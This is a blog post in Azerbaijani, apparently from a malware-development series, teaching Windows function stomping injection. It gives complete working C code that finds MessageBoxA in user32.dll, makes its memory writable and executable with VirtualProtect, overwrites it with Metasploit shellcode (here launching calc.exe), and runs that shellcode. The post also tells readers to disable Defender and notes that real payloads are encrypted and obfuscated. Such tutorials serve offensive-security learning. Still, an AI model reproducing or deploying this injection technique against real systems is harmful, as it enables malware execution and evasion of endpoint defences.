---
layout: post
title:  "Function stomping injection"
date:   2023-05-11 04:00:59 +0400
categories: malware-development
tags: [function-stomping, process-injection, malware-development, shellcode, windows]
lang: az
ref: stomping
permalink: /malware-development/2023/05/11/function-stomping-injection.html
description: "Bu blog yazısında function stomping injection haqqında və onu necə tətbiq edə biləcəyimizdən danışacağam."
canonical_url: "https://medium.com/@Cushz/function-stomping-injection-d2b942faa190"
---

<figure>
  <img src="/assets/img/function-stomping/1-3fFYzrqhg7S83Uz_6bXm2Q.png" alt="screenshot" loading="lazy">
</figure>

Bu blog yazısında function stomping injection haqqında və onu necə tətbiq edə biləcəyimizdən danışacağam.

\*\*Bu yazı 2023-cü ildə deyil, 2024-cü ildə dərc olunub

Bir cümlə ilə desək, memory-də istənilən function-u overwrite etsək, onu istədiyimiz kimi işlətməyə məcbur edə bilərik.

Əgər Windows istifadə etmisinizsə, çox güman ki, DLL termini ilə qarşılaşmısınız. DLL-lər sadəcə function-lar saxlayan fayllardır. Məsələn, layihənizdə açılacaq bir messagebox yaratmaq istəyirsinizsə, onu sıfırdan yazmaq lazım deyil — User32.dll faylının içərisində olan MessageBox function-undan istifadə edə bilərsiniz. Sadəcə bu dll faylını import edib içindən istədiyiniz function-ları istifadə edirsiniz.

İndi bir düşünək: bu function-u dll faylından import etdikdə, o, memory-də harasa yazılmalıdır, elə deyilmi? Əgər memory-də həmin entry point-i tapa bilsək, onu overwrite də edə bilərik.

Amma nəzərə alınmalı bəzi məqamlar var. Məsələn, bu function əməliyyat sistemi tərəfindən çox istifadə olunursa nə olacaq, ya da bu memory sahəsində ümumiyyətlə write və ya execute icazəmiz yoxdursa?

ntdll.dll və ya kernel32.dll function-ları kimi ən çox istifadə olunan function-ları bu metodda işlətmək risklidir, çünki crash verə bilərlər. İcazələrə gəldikdə isə, onları sadəcə dəyişə bilərik.

Gəlin danışmağı dayandırıb yazmağa başlayaq.

```c
#include<stdio.h>
#include<Windows.h>
int main()
{
  if(MessageBoxA(NULL,"this is test message box","hi",MB_OK) == 0)
    {
      printf("function failed:%d\n",GetLastError()); return 1;
    }
return 0;
}
```

<figure>
  <img src="/assets/img/function-stomping/1-rKfUtiIh7U1l5ccbq0_iAw.png" alt="screenshot" loading="lazy">
</figure>

Bu, message box açmalı olan sadə C kodudur.

İndi MessageBoxA function-unu dəyişdirmək üçün onun yerini tapmalıyıq.

```c
hModule = LoadLibrary(TARGET_DLL);
 if(hModule == NULL)
    {
      printf("[-]failed to load the library:%d\n",GetLastError());
      return 1;
    }
pAddress = GetProcAddress(hModule,TARGET_FUNC);
 if(pAddress == NULL)
    {
      printf("[-]failed to get address:%d\n",GetLastError());
      return 1;
    }
```

<figure>
  <img src="/assets/img/function-stomping/1-2MWAEWmJ3G_LnZUIZh6EKQ.png" alt="output-unuz belə görünməlidir" loading="lazy">
  <figcaption>output-unuz belə görünməlidir</figcaption>
</figure>

Gördüyünüz kimi, kitabxanamızı yükləyirik (bizim halda “user32.dll”) və sonra `GetProcAddress` istifadə edərək function address-ini götürürük.

İndi gəlin kodu işlədək və memory-də əslində necə göründüyünə baxaq. (Daha ətraflı araşdırma üçün Process Hacker alətindən istifadə edəcəyik, quraşdırmağı tövsiyə edirəm.)

<figure>
  <img src="/assets/img/function-stomping/1-uTHtnGLB27M2iRQtZZqtYw.png" alt="screenshot" loading="lazy">
</figure>

Ətraflı baxsaq, görürük ki, user32.dll import olunub. İndi qısa bir xülasə edək.

Function-umuz `7fff89c1c210` ünvanında yerləşir və hex-in əsaslarını bilirsinizsə, dəqiq bilirsiniz ki, bu, `7fffc35000`-dən əvvəl gəlir. Beləliklə belə qənaətə gəlirik ki, o, ikinci hissədə yerləşir (gördüyünüz kimi, onu sağ tab-da açmışam).

Bir detal da odur ki, onun READ və EXECUTE icazələri var. Amma WRITE icazəsi yoxdur, ona görə də overwrite etmək üçün onu əlavə etməliyik.

İcazələri dəyişmək üçün eyni şəkildə WinAPI function-u olan `VirtualProtect`-dən istifadə edəcəyik.

```c
if(!VirtualProtect(pAddress,sizeof(buf),PAGE_READWRITE,&dwOldProtection)) // in here, you should use dwOldProtection, don't write NULL, as the function will fail
   {
       printf("[+]failed to change the permission:%d\n",GetLastError());
       return 1;
   }
```

İndi görürsünüz ki, lazım olan memory region-umuzun arasında 2 yeni section var və onların da READ icazəsi mövcuddur.

<figure>
  <img src="/assets/img/function-stomping/1-m8JvxruuCg9mYYCAW5jVUQ.png" alt="screenshot" loading="lazy">
</figure>

Vacib hissə bu writeable section-u öz shellcode-umuzla overwrite etməkdir.

Shellcode-un nə olduğunu bilmirsinizsə, o, əsasən exploitation üçün istifadə olunan byte array-dir. Bizim halda bu, kalkulyatordur. Shellcode-ları Metasploit ilə generate edə bilərsiniz, mən artıq generate etmişəm. Sadəcə google edin, tapacaqsınız.

```c
unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50" "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52" "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a" "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41" "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52" "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48" "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40" "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41" "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1" "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c" "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01" "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a" "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b" "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00" "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd" "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0" "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff" "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
```

Shellcode-u memory-dən göstərilən region-a kopyalayacaq memcpy-dən istifadə edəcəyik.

```c
memcpy(pAddress,buf,sizeof(buf));
```

<figure>
  <img src="/assets/img/function-stomping/1--RbECTX5XaTssgGniIR5aA.png" alt="screenshot" loading="lazy">
</figure>

Gördüyünüz kimi, kodumuz `7fffc1c210` ünvanına inject olunub. Amma onu execute edə bilmirik, çünki Execute icazəmiz yoxdur. Ona görə də icazəsini dəyişəcəyik.

Yenə `VirtualProtect`-dən istifadə edəcəyik, amma üçüncü parametr üçün fərqli flag ilə.

```c
if(!VirtualProtect(pAddress,sizeof(buf),PAGE_EXECUTE_READWRITE,&dwOldProtection))
    {
      printf("[-] failed to change the permission:%d\n",GetLastError());
      return 1;
    }
```

Son mərhələdə onu execute etməliyik. Sadəcə MessageBox function-unu yenidən çağırın və görəcəksiniz ki, message box əvəzinə kalkulyator açılır.

```c
if(MessageBoxA(NULL,"this is test message box","hi",MB_OK) == 0)
    {
        printf("function failed:%d\n",GetLastError());
        return 1;
    }
```

Digər bir yol isə `CreateThread` ilə shellcode-umuzu execute edəcək yeni thread yaratmaqdır.

```c
hThread = CreateThread(NULL,0,pAddress,NULL,0,NULL);
if(hThread == NULL)
  {
      printf("[-] failed to execute the payload:%d\n",GetLastError());
      return 1;
  }
WaitForSingleObject(hThread,INFINITE);
```

Burada soruşa bilərsiniz ki, niyə WaitForSingleObject function-undan istifadə edirik. Səbəb odur ki, thread yaradıldıqdan sonra main() function-undan çıxır və bu da process-i sonlandırır. Bizim thread bu process-in içindədir, deməli o da faktiki olaraq sonlandırılacaq. Bu səbəbdən koda demək lazımdır ki, thread-imizin execute olunmasını gözləsin və YALNIZ SONRA process-i sonlandırsın. Gözlənilən nəticəmiz kalkulyator olmalıdır.

Tam kod buradadır.

```c
#include<stdio.h>
#include<Windows.h>
#define TARGET_DLL "user32.dll"
#define TARGET_FUNC "MessageBoxA"
unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50" "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52" "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a" "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41" "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52" "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48" "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40" "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41" "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1" "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c" "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01" "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a" "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b" "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00" "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd" "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0" "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff" "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
int main()
{
HMODULE hModule = NULL;
PVOID pAddress = NULL;
DWORD dwOldProtection = NULL;
HANDLE hThread = NULL;
printf("[] press ENTER to load the dll");
getchar();
hModule = LoadLibrary(TARGET_DLL);
if(hModule == NULL)
  {
    printf("[-] failed to load the library:%d\n",GetLastError());
     return 1;
  }
pAddress = GetProcAddress(hModule,TARGET_FUNC);
if(pAddress == NULL)
{ printf("[-] failed to get address:%d\n",GetLastError());
  return 1;
}
printf("[+] Done\n");
printf("[+] Function is located at:0x%p\n",pAddress);
printf("[] Press enter to change the permission of the memory page");
getchar();
if(!VirtualProtect(pAddress,sizeof(buf),PAGE_READWRITE,&dwOldProtection))
  {
    printf("[+] failed to change the permission:%d\n",GetLastError());
    return 1;
  }
printf("[+] Permission has successfully changed\n");
printf("[] copy your shellcode to the specified memory");
getchar();
memcpy(pAddress,buf,sizeof(buf));
if(!VirtualProtect(pAddress,sizeof(buf),PAGE_EXECUTE_READWRITE,&dwOldProtection))
  {
    printf("[-] failed to change the permission:%d\n",GetLastError());
    return 1;
  }
printf("[] press enter to run your injected code");
getchar();
hThread = CreateThread(NULL,0,pAddress,NULL,0,NULL);
if(hThread == NULL)
    {
      printf("[-] failed to execute the payload:%d\n",GetLastError());
      return 1;
    }
WaitForSingleObject(hThread,INFINITE);
// or as i have said before, run the MessageBoxA function again
return 0;
}
```

<figure>
  <img src="/assets/img/function-stomping/1-3DR0npVkPngcTydrh6CqnQ.png" alt="screenshot" loading="lazy">
</figure>

Qeydlər:

- Defender-i söndürməlisiniz, əks halda shellcode-a görə aşkarlanacaq. Real həyatda onlar encrypt və obfuscate olunur.
- Function-ları daha yaxşı başa düşmək üçün MSDN sənədlərindən istifadə edin.
- Rəy bildirməkdən çəkinməyin.
